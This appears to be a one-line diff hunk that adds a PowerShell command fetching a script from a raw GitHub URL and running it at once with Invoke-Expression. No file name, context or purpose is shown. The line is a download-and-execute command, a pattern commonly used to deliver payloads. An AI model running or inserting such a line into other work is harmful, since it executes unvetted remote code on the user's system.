@@ -1,0 +1,1 @@
+iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/m-nobinur/gnc/main/ready.ps1'))
